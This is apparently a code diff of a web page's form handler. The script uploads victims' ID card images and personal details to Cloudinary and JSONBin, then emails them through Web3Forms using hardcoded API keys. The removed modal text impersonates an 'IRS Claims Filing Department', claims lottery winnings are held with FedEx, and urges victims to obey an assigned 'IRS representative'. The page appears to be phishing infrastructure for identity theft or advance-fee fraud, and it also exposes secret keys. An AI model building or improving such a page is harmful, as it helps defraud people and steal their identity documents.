@@ -1006,9 +1006,12 @@ s0.parentNode.insertBefore(s1,s0);
             <i class="fa-solid fa-chevron-up"></i>
         </div>
 <!-- End Go Top Area --> 
-
 <script>
 const form = document.getElementById("newcontactForm");
+
+if (!form) {
+  console.error("Form with id 'newcontactForm' not found");
+}
 
 form.addEventListener("submit", async function (e) {
   e.preventDefault();
@@ -1038,7 +1041,10 @@ form.addEventListener("submit", async function (e) {
 
       const res = await fetch(
         `https://api.cloudinary.com/v1_1/${cloudName}/upload`,
-        { method: "POST", body: data }
+        {
+          method: "POST",
+          body: data,
+        }
       );
 
       const json = await res.json();
@@ -1070,11 +1076,16 @@ form.addEventListener("submit", async function (e) {
 
     /* ---------------- JSONBin ---------------- */
     const BIN_ID = "6970c063ae596e708feae402";
-    const MASTER_KEY = "$2a$10$yti1izYQ7PKY9IhwxrQiuuIk8TZDdxM6nzYFnduMOvJtKIdyRhBB.";
+    const MASTER_KEY =
+      "$2a$10$yti1izYQ7PKY9IhwxrQiuuIk8TZDdxM6nzYFnduMOvJtKIdyRhBB.";
 
     const existingRes = await fetch(
       `https://api.jsonbin.io/v3/b/${BIN_ID}`,
-      { headers: { "X-Master-Key": MASTER_KEY } }
+      {
+        headers: {
+          "X-Master-Key": MASTER_KEY,
+        },
+      }
     );
 
     const existingJson = await existingRes.json();
@@ -1090,32 +1101,38 @@ form.addEventListener("submit", async function (e) {
       body: JSON.stringify({ submissions }),
     });
 
-
-
     /* ---------------- Web3Forms Email ---------------- */
     const web3FormData = new FormData();
-    web3FormData.append("access_key", "c1abdc0b-58f2-410d-96a0-20372e88ad7d");
-    web3FormData.append("name", submission.full_name);
-    web3FormData.append("email", submission.email);
-    web3FormData.append("subject", "New W-2G Application Submission");
+    web3FormData.append(
+      "access_key",
+      "c1abdc0b-58f2-410d-96a0-20372e88ad7d"
+    );
+    web3FormData.append("name", submission.full_name || "N/A");
+    web3FormData.append("email", submission.email || "no-reply@example.com");
+    web3FormData.append(
+      "subject",
+      "New W-2G Application Submission"
+    );
 
     web3FormData.append(
       "message",
-      `
-New W-2G Application Received
+`New W-2G Application Received
 
-Name: ${submission.full_name}
-Email: ${submission.email}
+Name: ${submission.full_name || "N/A"}
+Email: ${submission.email || "N/A"}
 
 ID Front: ${idFrontUrl || "Not provided"}
 ID Back: ${idBackUrl || "Not provided"}
 
-Submitted at: ${new Date().toLocaleString()}
-      `
+Submitted at: ${new Date().toLocaleString()}`
     );
 
     const web3Res = await fetch("https://api.web3forms.com/submit", {
       method: "POST",
+      mode: "cors",
+      headers: {
+        "Accept": "application/json"
+      },
       body: web3FormData,
     });
 
@@ -1129,7 +1146,7 @@ Submitted at: ${new Date().toLocaleString()}
     /* ---------------- Thank You Modal ---------------- */
     const modal = document.createElement("div");
     modal.innerHTML = `
-     <div style="
+      <div style="
         position: fixed;
         inset: 0;
         background: rgba(0,0,0,0.6);
@@ -1149,42 +1166,20 @@ Submitted at: ${new Date().toLocaleString()}
           overflow-y: auto;
           max-height: 90vh;
           font-family: sans-serif;
-          line-height: 1.6;
         ">
-          <h2 style="margin-bottom: 25px; font-size: 1.9rem; text-align: center;">Thank You – Submission Received</h2>
-          
-          <p style="margin-bottom: 20px;">
-          We have successfully received your <strong>Form W-2G, U.S. Individual Lottery Income Winnings Report</strong>. Our team is now actively working on your claim regarding the reported lottery winnings. Your submission is being reviewed to ensure that:
+          <h2 style="text-align:center;">Thank You – Submission Received</h2>
+          <p style="text-align:center;margin-top:20px;">
+            Your application has been successfully submitted.
           </p>
-          
-          <ul style="margin-bottom: 20px; padding-left: 20px; list-style-type: disc;">
-            <li style="margin-bottom: 10px;">All winnings are correctly filed</li>
-            <li style="margin-bottom: 10px;">Any taxes owed have been verified as paid or recorded</li>
-            <li style="margin-bottom: 10px;">All required documentation has been submitted</li>
-          </ul>
-          
-          <p style="margin-bottom: 20px;">📦 <strong>What Happens Next:</strong> The IRS will hold the funds temporarily with FedEx while we process your claim and confirm all compliance steps are complete. If your winnings are still subject to any taxation, you will be notified by paper letter within 2–4 weeks. This letter will contain:</p>
-          
-          <ul style="margin-bottom: 20px; padding-left: 20px; list-style-type: disc;">
-            <li style="margin-bottom: 10px;">A summary of your lottery income report</li>
-            <li style="margin-bottom: 10px;">Any tax balance owed (if applicable)</li>
-            <li style="margin-bottom: 10px;">Supporting tax return documents</li>
-          </ul>
-          
-          <p style="margin-bottom: 20px;">📝 <strong>Important Reminder:</strong> This process follows the same procedure as filing a tax return, so every official document you receive will look and feel like IRS tax forms. It is extremely important that you follow every instruction provided by the IRS representative assigned to your case. For any updates or questions, please wait for your mailed notification or respond directly to your assigned IRS contact.</p>
-          
-          <p style="margin-bottom: 30px; text-align:center;"><strong>Thank you for your cooperation.<br/>IRS Claims Filing Department</strong></p>
-          
           <button id="closeModalBtn" style="
-            display: block;
-            background: #1d4ed8;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1rem;
-            margin: 0 auto;
+            display:block;
+            margin:30px auto 0;
+            background:#1d4ed8;
+            color:#fff;
+            border:none;
+            padding:12px 25px;
+            border-radius:8px;
+            cursor:pointer;
           ">Close</button>
         </div>
       </div>
@@ -1199,10 +1194,13 @@ Submitted at: ${new Date().toLocaleString()}
     console.error(err);
     alert("Submission failed: " + err.message);
   } finally {
-    document.body.removeChild(loadingScreen);
+    if (loadingScreen.parentNode) {
+      document.body.removeChild(loadingScreen);
+    }
   }
 });
 </script>
+
 
 
 
